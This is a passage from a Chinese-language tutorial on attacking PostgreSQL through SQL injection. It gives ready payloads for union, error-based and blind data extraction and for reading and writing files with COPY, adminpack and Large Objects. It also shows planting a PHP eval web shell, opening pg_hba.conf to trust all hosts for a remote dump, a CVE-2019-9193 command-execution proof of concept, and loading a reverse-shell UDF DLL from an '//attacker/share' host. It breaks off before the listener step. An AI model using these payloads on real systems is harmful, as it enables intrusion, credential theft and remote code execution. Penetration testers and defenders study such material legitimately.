<li><p>由于服务器脚本在处理返回字段时会将此字段表达的字节直接输出到 Response 流中(只有这样用户才能从浏览器中看到完整的图片)，所以某些需要判断关键字的注入工具在这里是不起作用的，只能通过手<br>工进行注入。</p>
</li>
<li><p>由于服务器可能会返回 <code>image/jpeg</code> 头，在浏览器中测试可能导致即使注入成功也只会返回一个错误图片的红叉，所以建议一旦确定是 Union-Image 型注入，建议转为使用 Burp 等工具进行操作。</p>
</li>
</ol>
<p>例如，访问：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Image.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;%e6%96%b0&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>则会返回字符“新”（%e6%96%b0 为 URL 编码后经过 UTF8 编码后的“新”</p>
<p>访问：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Image.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;&#x27;</span>,table_schema::text::bytea <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;pg_catalog&#x27;</span>,<span class="string">&#x27;information_schema&#x27;</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">1</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>即可列出第一个 Schema 名称,逐渐修改 offset 的值即可获取所有的 Schema 名称。</p>
<h3 id="Union-Download注入"><a href="#Union-Download注入" class="headerlink" title="Union-Download注入"></a>Union-Download注入</h3><p>最后一种暂时称之为 Union-Download 型注入点，也就是服务器将上传的文件保存在某个目录下（例如为了安全起见，统一保存在网站目录上一级中的 uploads 目录中，即/../uploads,以防止上传攻击），同时在数据库中保存文件的路径。用户下载文件时服务器脚本根据传递的 id 获取文件路径，读取文件并直接输出到 Response 流。</p>
<p>这种 Union-Download 型注入点并不是非常常见，但一旦发现,则必然是一个危害性不亚于注入的任意文件下载漏洞。在非文件服务器与 web 服务器分离的情况下可能通过此注入点下载网站所有脚本并进一步攻击，危害可谓极大（在 linux 权限划分极为严格的情况下，postgres 用户是不可能访问网站目录的。而此漏洞却突破了这个限制，危害自然不言而喻）。</p>
<p>Download.php 模拟了此种注入的情形,访问：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Download.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;/download.php&#x27;</span>,<span class="string">&#x27;3&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>



<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>借助强制类型转换所导致的报错来获取信息。这就需要一个前提：服务器脚本可以返回一些数据库错误信息。</p>
<p>payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 获取当前数据库</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">select</span> a::<span class="type">int</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="string">&#x27;~&#x27;</span><span class="operator">||</span>current_database() <span class="keyword">as</span> a)x <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"># 获取当前schema</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">select</span> a::<span class="type">int</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="string">&#x27;~&#x27;</span><span class="operator">||</span><span class="built_in">CURRENT_SCHEMA</span> <span class="keyword">as</span> a)x <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"># 获取schema为public的第<span class="number">1</span>张表名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">select</span> a::<span class="type">int</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="string">&#x27;~&#x27;</span><span class="operator">||</span>table_name <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;public&#x27;</span> limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>)x <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"># 获取public.Users的第<span class="number">1</span>个字段名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">select</span> a::<span class="type">int</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="string">&#x27;~&#x27;</span><span class="operator">||</span>column_name <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;public&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;Users&#x27;</span> limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>)x <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"># 获取public.User表的数据</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">select</span> a::<span class="type">int</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="string">&#x27;~&#x27;</span><span class="operator">||</span>concat_ws(<span class="string">&#x27;--&#x27;</span>,username,password) <span class="keyword">as</span> a <span class="keyword">from</span> public.&quot;Users&quot; limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>)x <span class="comment">--</span></span><br></pre></td></tr></table></figure>



<h2 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h2><p>当服务器脚本屏蔽了错误回显，同时不能使用 union 的情况下，可以采用盲注的手法获取数据。</p>
<p>这种盲注手法需要用到两个函数：<code>substr()</code> 和 <code>ascii()</code>。substr 用于从指定位置截取指定长度的字符串，ascii 用于将字符转换为 ascii 码。</p>
<p>获取到 ascii 码之后，将其与数字进行比较即可获取字符串的值，例如以下payload会在当前的Schema 名称的首字母为小写时返回 true：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(<span class="built_in">current_schema</span>(),<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">between</span> <span class="number">97</span> <span class="keyword">and</span> <span class="number">122</span></span><br></pre></td></tr></table></figure>

<p>通过构造不同语句，逐个获取字符并比较，即可取得任何的信息。</p>
<h2 id="时间型盲注"><a href="#时间型盲注" class="headerlink" title="时间型盲注"></a>时间型盲注</h2><p>基于时间的盲注，通过判断延时语句是否执行来获知条件是否为真或语句是否执行。</p>
<p>在 postgres 中,延时的语句为<code>pg_sleep(int)</code>。其中 int 表示要等待的秒数。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">select</span> pg_sleep(<span class="number">5</span>) <span class="keyword">where</span> (<span class="keyword">select</span> ascii(substr(<span class="built_in">CURRENT_USER</span>,<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">&gt;</span> <span class="number">90</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>通过构造不同语句，逐个获取字符并比较，即可取得任何的信息。</p>
<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><h3 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h3><p>网上能够找到的资料中 postgres 注入读写文件大多都是使用 copy 操作符。copy 可以从将文件导入数据库，或是从数据库导出文件。</p>
<h4 id="copy-from-导入文件"><a href="#copy-from-导入文件" class="headerlink" title="copy from 导入文件"></a>copy from 导入文件</h4><p>可以配合堆叠注入，先新建一个表，再将文件内容导入到表中。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test_for_copy(data text);</span><br><span class="line"><span class="keyword">copy</span> test_for_copy(data) <span class="keyword">from</span> <span class="string">&#x27;c:/temp/file.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>之后使用 select 语句便可进行查询。</p>
<blockquote>
<p>看起来似乎很美好，但 copy from 有以下缺陷：</p>
<ol>
<li><p>分隔符</p>
<p>默认情况下 postgres 认为制表符(\t,0x09)为两个字段的分隔符，同时以换行符作为每一<br>行的分隔符。如果要导入的文件中含有制表符，那么制表符至下一个换行符之间的内容都被认为是另一个字段，如果目标表只有一个字段，则会出错。</p>
<p>这其实不是什么太大的问题，copy 提供 <code>delimiter</code> 选项用以制定分隔符，例如以下语句将分隔符指定为 0x7f(这个符号在绝大多数文本文件内不可能出现)：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">copy</span> test_for_copy(data) <span class="keyword">from</span> <span class="string">&#x27;c:/temp/files.txt&#x27;</span> <span class="keyword">with</span> delimiter E<span class="string">&#x27;\x7f&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
</ol>
<ol start="2">
<li><p>遇到<code>\.</code>时会终止并报错</p>
<p>如果一个文件中包含<code>\.</code>，那么使用 copy from 语句导入时会返回“copy<br>命令结束标记损坏”的错误(原因是<code>\.</code>是 copy from stdin 模式下的结束标识,具体参考本节最后的官方文档)。<br>一个典型就是 apache 的配置文件。大大多数情况下 apache 配置文件中都有以下语句：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;^\<span class="attr">.ht</span>&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于出现了<code>\.</code>，所以语句将出错,导致无法导入。而在找不到网站路径时读取配置文件是相当重要且行之有效的方法，出现这种情况非常令人恼火。</p>
</li>
</ol>
<ol start="3">
<li><p>导入文件编码必须与服务器编码相对应</p>
<p>Copy from 只能导入与服务器编码相同的文本文件（一般为默认值 UTF8），如果导入文件中以服务器编码加载时出现无效字符，则会返回“无效的 XXXX 编码字节顺序”的错误，其中 XXXX 为编码名称，如 UTF8。例如,在一个文本文件中写入文本“测试”了，并以 ANSI 编码保存（这样在简体中文操作系统中文件实际的编码为 GB2312），执行语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">copy</span> test_for_copy(data) <span class="keyword">from</span> <span class="string">&#x27;c:/temp/files.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>会返回以下错误信息：<code>无效的 &quot;UTF8&quot; 编码字节顺序: 0xb2</code></p>
<p>同样的,既然无法导入不同编码的文件,那么导入二进制文件更加是不可能的。如果通过某些漏洞（例如编辑器带来的目录遍历）获取到服务器重要备份文件路径（非 web 目录下），结果却无法将其下载下来,这无疑会让人十分恼火。</p>
</li>
</ol>
</blockquote>
<h4 id="copy-to-导出文件"><a href="#copy-to-导出文件" class="headerlink" title="copy to 导出文件"></a>copy to 导出文件</h4><p>copy to 可以将一个表中的字段或一个查询的结果导出到文件中，用于脱裤是很方便的。</p>
<p>例如，以下语句会将 files 表的内容全部备份到 <code>c:/temp/files.txt</code>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">copy</span> files <span class="keyword">to</span> <span class="string">&#x27;c:/temp/files.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>以下语句会将 php 一句话<code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code>写入 <code>C:\Wamp\apache2.4\htdocs\WWW\a.php</code>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">copy</span> (<span class="keyword">select</span> $$<span class="operator">&lt;</span>?php <span class="variable">@eval</span>($_POST[<span class="string">&#x27;pass&#x27;</span>]);?<span class="operator">&gt;</span>$$) <span class="keyword">to</span> <span class="string">&#x27;C:\Wamp\apache2.4\htdocs\WWW\a.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>但是 copy to 也有一个缺点：任何不能转换为字符串的字节都将被转换为八进制形式。</p>
<h3 id="AdminPack"><a href="#AdminPack" class="headerlink" title="AdminPack"></a>AdminPack</h3><p>Adminpack 是 postgres 在 8.2 新加入的一个拓展，这个拓展可以包含一系列函数，可以在允许的范围内进行文件操作。</p>
<p>这些函数大多数并没有添加，需要手动进行添加。已经添加的函数列表如下，adminpack 会将其指定为另一个别名（原始名称仍可用）：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">pg_read_file(text, <span class="type">bigint</span>, <span class="type">bigint</span>)</span><br><span class="line">pg_stat_file(text)</span><br><span class="line">pg_rotate_logfile()</span><br></pre></td></tr></table></figure>

<p>其余函数的添加语句见 postgres 安装目录下：</p>
<p><code>/share/extension/adminpack-1.0.sql</code>（windows）</p>
<p>或 postgres 源码目录下：</p>
<p><code>/contrib/adminpack/adminpack--1.0.sql</code>（linux，仅源码安装方式）</p>
<p>注意：在 linux 下需手动编译 <code>adminpack.c</code>，命令为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc $PGSRC/contrib/adminpack/adminpack.c -shared -fPIC -/usr/local/pgsql/include/server -o adminpack.so</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 其中<span class="variable">$PGSRC</span> 为 postgres 源码路径</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：由于 <code>pg_ls_dir(text)</code>、<code>pg_read_binary_file(text, bigint, bigint)</code>两个函数与 adminpack 函数极为相似，所以在此也归为 adminpack 函数中。</p>
</blockquote>
<p><strong>adminpack的局限性</strong>：</p>
<p>adminpack 可以进行在允许的范围内文件操作，但范围只限于数据目录中。也就是说,在数据目录外的文件不可能通过 adminpack 函数进行操作。</p>
<p>Adminpack 函数的源代码见：</p>
<ul>
<li><a href="http://doxygen.postgresql.org/adminpack_8c_source.html">http://doxygen.postgresql.org/adminpack_8c_source.html</a>  (sql 文件中前五个函数)</li>
<li><a href="http://doxygen.postgresql.org/genfile_8c_source.html">http://doxygen.postgresql.org/genfile_8c_source.html</a>  (其余的 adminpack 函数)</li>
</ul>
<p>可以看到,这些进行文件操作的函数都经过 <code>convert_and_check_filename</code> 函数进行检测。如果使用绝对路径查询,会返回“不允许使用绝对路径”的错误；如果路径中使用了..跳转到上级目录，则返回“路径必须在当前目录或子目录下”的错误。</p>
<p>这样，adminpack 只能读取数据目录的文件或向其中写入文件，限制目录的文件读取作用有限，同时由于 <code>pg_file_write</code> 的函数签名为 <code>pg_file_write(text,text,boolean)</code>，其中第一个参数为路径，第二个参数为要写入的内容，第三个参数为是否追加，导致写入二进制文件是不可能的(postgres 不允许 0 字符)。</p>
<p>当然，adminpack 也不是完全没有用处，由于 postgres 对于登陆的授权文件 <code>pg_hba.conf</code> 也处于 data目录，刚好可以由 adminpack 函数编辑。所以当可以使用 adminpack 函数时，可以尝试以下操作：</p>
<h4 id="写入pg-hba-conf文件"><a href="#写入pg-hba-conf文件" class="headerlink" title="写入pg_hba.conf文件"></a>写入pg_hba.conf文件</h4><p>执行查询语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> inet_server_addr();</span><br></pre></td></tr></table></figure>

<p>将返回数据库的 IP 地址(相对于本次连接)，如果为 127.0.0.1，则说明与 web 服务器为相同 ip。</p>
<p>之后执行查询语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> pg_file_write(<span class="string">&#x27;pg_hba.conf&#x27;</span>,chr(<span class="number">10</span>)<span class="operator">||</span><span class="string">&#x27;host all all 0.0.0.0/0 trust&#x27;</span><span class="operator">||</span>chr(<span class="number">10</span>),<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p>这将在 <code>pg_hba.conf</code> 末尾添加一条授权，表示允许来自任何 ip 的任何用户使用任何用户（包括 postgres）连接任何数据库，同时信任本次连接，不要求任何授权验证（除非有其余语句显式限制了某个 IP 段）。</p>
<h4 id="读取pg-hba-conf文件"><a href="#读取pg-hba-conf文件" class="headerlink" title="读取pg_hba.conf文件"></a>读取pg_hba.conf文件</h4><p>执行查询语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> pg_read_file(<span class="string">&#x27;pg_hba.conf&#x27;</span>)::<span class="type">int</span>;</span><br></pre></td></tr></table></figure>

<p>读取 <code>pg_hba.conf</code> 并分析，必要时将 <code>pg_file_write</code> 函数的第三个参数设为 <code>false</code>，从而达到覆盖配置文件的效果。</p>
<p>然后等待数据库服务器重启（windows 下面配置文件一经修改会自动重新加载，可以直接进行连接），最后即可使用 psql 工具远程连接数据库执行查询，或是用 pgadmin/pg_dump 脱裤。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 连接远程数据库 192.168.123.188，并将 <span class="built_in">test</span> 数据库备份到本地 back.backup 文件中</span></span><br><span class="line">pg_dump.exe -w --host 192.168.123.188 --username &quot;postgres&quot; --compress 9 --no-password --blobs --section pre-data --section data --section post-data --encoding UTF8 --inserts --column-inserts --verbose --file back.backup &quot;test&quot;</span><br></pre></td></tr></table></figure>



<h3 id="Large-Object"><a href="#Large-Object" class="headerlink" title="Large Object"></a>Large Object</h3><p>Large Object 可以近似的看作储存于数据库中的逻辑文件，在使用时可以完全的将其作为文件进行操作。</p>
<blockquote>
<p>注：操作 Large Object 要求 super 权限。</p>
</blockquote>
<h4 id="创建大对象"><a href="#创建大对象" class="headerlink" title="创建大对象"></a>创建大对象</h4><p>创建大对象有两种方法：新建或导入。</p>
<p>使用 <code>lo_creat</code> 函数即可创建一个空的大对象，并由系统自动分配 oid，例如执行语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_creat(<span class="number">-1</span>);</span><br></pre></td></tr></table></figure>

<p>会返回一个 oid，例如 73954。</p>
<p>也可以使用 <code>lo_create</code> 函数创建空的大对象，并将大对象与指定的 oid 相关联。例如执行语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_create(<span class="number">-1</span>);</span><br></pre></td></tr></table></figure>

<p>会返回 4294967295，表示成功创建 oid 为 4294967295 的大对象。</p>
<p>或者可以使用 <code>lo_import</code> 将某个已存在的文件导入为大对象，并由系统自动分配 oid，例如执行语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_import(<span class="string">&#x27;c:/windows/system32/cmd.exe&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>会返回一个 oid，例如 73955，同时大对象中的数据即为完整的 cmd.exe。</p>
<p>也可以手动指定大对象的 oid，注意这个 oid 不可与其他大对象的 oid 相重复，例如执行语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> lo_import(<span class="string">&#x27;c:/windows/system32/cmd.exe&#x27;</span>,<span class="number">12345678</span>);</span><br></pre></td></tr></table></figure>

<p>会返回 12345678，表示成功创建 oid 为 12345678 的大对象并将 cmd.exe 导入其中。</p>
<h4 id="打开大对象"><a href="#打开大对象" class="headerlink" title="打开大对象"></a>打开大对象</h4><p>创建完大对象后便可以使用 <code>lo_open</code> 打开这个大对象，<code>lo_open</code> 的函数签名为 <code>lo_open(oid, int)</code>，第一个参数为大对象的 oid，第二个参数为读写模式，是一个常量。</p>
<p>这个函数在官方函数文档中没有任何说明，在 API 文档中的说明为“打开一个大对象返回其操作描述符”，但实际上在查询语句中使用时不论如何都会返回 0。</p>
<p>而读写模式也没有任何说明，对照 API 文档并结合源码最终发现这个模式在文件：<code>include/libpq/libpq-fs.h</code>中提供了定义：</p>
<p><img src="https://i.loli.net/2021/10/11/py9cSIR7TmCftoA.png" alt="image-20211011141407201"></p>
<p>这个模式可以进行位操作，指定其为 INV_READ|INV_WRITE (0x00060000)即代表可以同时进行读写操作。</p>
<p>综上,可以使用以下语句打开一个大对象,并指定操作为写入：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_open(<span class="number">73954</span>,x<span class="string">&#x27;20000&#x27;</span>::<span class="type">int</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：打开一个大对象之后，大对象的数据指针会指向其最开始的那个字节。</p>
</blockquote>
<h4 id="写入大对象"><a href="#写入大对象" class="headerlink" title="写入大对象"></a>写入大对象</h4><p>写入大对象需要使用函数 <code>lowrite</code>( 注意这里没有下划线 ) , <code>lowrite</code> 的函数签名为<code>lowrite(int,bytea)</code>，第一个参数为由 <code>lo_open</code> 函数打开所返回的句柄，第二个参数为要写入的内容（从这里就能看出，可以向大对象中写入任何内容）。同样的，这个函数在官方函数文档也没有任何说明。</p>
<p>例如以下语句会将 0xfeffbf 写入 oid 为 73954 的大对象中：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_open(<span class="number">73954</span>,x<span class="string">&#x27;20000&#x27;</span>::<span class="type">int</span>);</span><br><span class="line"><span class="keyword">select</span> lowrite(<span class="number">0</span>,decode(<span class="string">&#x27;feffbf&#x27;</span>,<span class="string">&#x27;hex&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>注意：这里使用 decode 函数将 hex 值转换为字节数组，直接使用 unknown 类型是不正确的。</p>
<p>有时候可能需要分多次将数据导入同一个大对象中，这就要求每一次进行写操作前大对象的数据指针都指向末尾，使用 <code>lo_lseek</code> 函数即可完成这一点。</p>
<p><code>lo_lseek</code> 的函数签名为 <code>lo_lseek(int,int,int)</code>，第一个参数为由 <code>lo_open</code> 函数打开所返回的句柄，第二个参数为相对位置，第三个参数为相对位置的起始点，是一个常量。</p>
<p>和 <code>lo_open</code> 类似,这个在官方函数文档没有任何说明，通过对比 API 文档并查看源码最终在文件：<code>include/zconf.h</code>中发现以下定义：</p>
<p><img src="https://i.loli.net/2021/10/11/hwY5NrIgKObSnxM.png" alt="image-20211011192152967"></p>
<p>综上,可以使用以下语句打开 oid 为 73954 的大对象，并将其数据指针指向末尾：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_open(<span class="number">73954</span>,x<span class="string">&#x27;60000&#x27;</span>::<span class="type">int</span>);</span><br><span class="line"><span class="keyword">select</span> lo_lseek(<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>之后便可以使用 <code>lowrite</code> 函数直接向这个大对象中写入内容。</p>
<h4 id="导出大对象"><a href="#导出大对象" class="headerlink" title="导出大对象"></a>导出大对象</h4><p>当完成对一个大对象的导入/写入操作后，接下来需要做的就是获取其内容（针对导入，即读取文件）</p>
<p>将大对象导出可以使用 <code>lo_export</code> 函数，这个函数的签名为<code>lo_export(oid,text)</code>，第一个参数为要导出的大对象的 oid，第二个参数为导出的路径，如果导出路径为相对路径，则会导入至当前的数据目录中。</p>
<p>例如，执行以下语句会将 oid 为 73954 的大对象导出至 <code>c:/windows/temp/123.txt</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_export(<span class="number">73954</span>,<span class="string">&#x27;c:/windows/temp/1.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>Postgres 会将所有的大对象数据保存于 <code>pg_catalog</code> 目录下的 <code>pg_largeobject</code> 目录对象中，这个目录对象有三个字段，loid、pageno、data。</p>
<ul>
<li>loid 代表大对象的 oid，与 <code>lo_create</code> 等函数的返回值相同。</li>
<li>pageno 为分页序号，大对象的数据会被分为多个页进行储存,这个字段就是每个页之间的序号。</li>
<li>Data 为储存在这一页中的部分大对象数据，为 bytea 类型。</li>
</ul>
<p>于是在知道 oid 的时候，可以使用以下语句获取一个大对象中所有的数据：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">array_agg</span>(b)::text::<span class="type">int</span> <span class="keyword">from</span>(<span class="keyword">select</span> encode(data,<span class="string">&#x27;hex&#x27;</span>)b,pageno <span class="keyword">from</span> pg_largeobject <span class="keyword">where</span> loid<span class="operator">=</span><span class="number">73957</span> <span class="keyword">order</span> <span class="keyword">by</span> pageno)a<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>从返回的错误信息中去掉花括号、逗号，仅保留 HEX 字符，之后将所有的 HEX 字符粘贴到 winhex 中即可完整的还原这个大对象。</p>
<h4 id="关闭大对象"><a href="#关闭大对象" class="headerlink" title="关闭大对象"></a>关闭大对象</h4><p>当需要关闭一个大对象时,可以使用 <code>lo_close</code> 函数，这个函数的签名为 <code>lo_close(int)</code>，参数为由<code>lo_open</code> 函数打开所返回的句柄。</p>
<p>例如，使用以下语句即可关闭已经打开的大对象：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> lo_open(<span class="number">73954</span>,x<span class="string">&#x27;60000&#x27;</span>::<span class="type">int</span>);</span><br><span class="line"><span class="keyword">select</span> lo_close(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>



<h4 id="删除大对象"><a href="#删除大对象" class="headerlink" title="删除大对象"></a>删除大对象</h4><p>最后，如果需要删除一个大对象，需要使用 <code>lo_unlink</code> 函数，例如执行以下语句会将 oid 为 73954 的大对象永久删除。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> lo_unlink(<span class="number">73954</span>);</span><br></pre></td></tr></table></figure>



<blockquote>
<p>另：一个小技巧。在 linux 系统下如果 lo_import 等函数的第一个参数指向的路径是一个目录,则会返回以下错误：</p>
<p><code>ERROR: could not read server file &quot;/&quot;: 是一个目录</code></p>
<p>而在 windows 下会返回：</p>
<p><code>错误: 无法打开服务器文件 &quot;c:/windows/temp&quot;: Permission denied</code></p>
<p>这个错误提示在注入中可以用来猜测目录，在有时会有意想不到的收获。</p>
</blockquote>
<h3 id="高权限命令执行漏洞-CVE-2019-9193"><a href="#高权限命令执行漏洞-CVE-2019-9193" class="headerlink" title="高权限命令执行漏洞 [CVE-2019-9193 ]"></a>高权限命令执行漏洞 [CVE-2019-9193 ]</h3><p><strong>受影响版本</strong></p>
<ul>
<li>PostgreSQL 9.3至11.2</li>
</ul>
<p>其9.3到11版本中存在一处“特性”，管理员或具有<code>COPY TO/FROM PROGRAM</code>权限的用户，可以使用这个特性执行命令。</p>
<p>POC：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> cmd_exec;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> cmd_exec(cmd_output text);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">COPY</span> cmd_exec <span class="keyword">FROM</span> PROGRAM <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> cmd_exec;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/11/WIpTe1XgxUNdhD5.png" alt="image-20211011204600384"></p>
<p>可以看到成功执行了系统命令，不过能够执行的命令有限。</p>
<h3 id="利用UDF函数获取反弹Shell"><a href="#利用UDF函数获取反弹Shell" class="headerlink" title="利用UDF函数获取反弹Shell"></a>利用UDF函数获取反弹Shell</h3><p>Postgres 支持许多种语言自定义函数，默认情况    下开启 plpgsql 和 c，其中 plpgsql 为标准的 sql 语句，而 c 则与 mysql UDF 类似，会加载一个动态链接库到进程空间。这样如果将 UDF 中的函数实现替换为特定的代码，就能在数据库权限下进行更多的操作（例如执行某些命令，或是干脆直接反弹回一个 shell等等）。</p>
<p>如果是其他类型数据库的注入点直接加载 UDF 似乎是不可能的，不过 postgres 强大的 Large Object将这一切变为了可能。</p>
<p>在进行这一特性的利用之前,首先需要了解如何编写 postgres 的 UDF 函数。这需要使用 postgres 附带的头文件。</p>
<p>首先需要生成一个编写一个恶意动态链接库文件（可以使用sqlmap生成）。</p>
<blockquote>
<p>另：建议将生成的动态链接库文件使用 UPX 进行压缩,这样可以有效地减少文件体积。</p>
</blockquote>
<p><img src="https://i.loli.net/2021/10/11/lv83s4GQDLkH6cA.png" alt="image-20211011223750392"></p>
<p>假设现在已经拥有保存于 <code>c:/windows/temp/test.dll</code>、导出函数名为 <code>GetResvShell</code> 的一个 UDF 文件。同时这个函数会接受两个参数，第一个参数为 text 类型，表示要反弹到的远程主机，第二个参数为 int 型，表示远程主机的端口，并且会返回一个 int 型的数值表示执行的结果，那么使用以下 sql 语句即可将此文件与其导出函数 <code>GetResvShell</code> 注册为函数 test：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">function</span> test(text,<span class="type">int</span>) <span class="keyword">returns</span> <span class="type">int</span> <span class="keyword">as</span> <span class="string">&#x27;c:/windows/temp/test.dll&#x27;</span>,<span class="string">&#x27;GetResvShell&#x27;</span> <span class="keyword">language</span> c;</span><br></pre></td></tr></table></figure>

<p>注：不止可以使用绝对路径，也可以使用UNC来加载动态链接库。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> test(text, <span class="type">integer</span>) <span class="keyword">returns</span> <span class="type">int</span> <span class="keyword">as</span> <span class="string">&#x27;//attacker/share/test.dll&#x27;</span>, <span class="string">&#x27;GetResvShell&#x27;</span> <span class="keyword">language</span> c;</span><br></pre></td></tr></table></figure>



<p>最后，在远程主机监听 8888 端口，同时执行：</p>
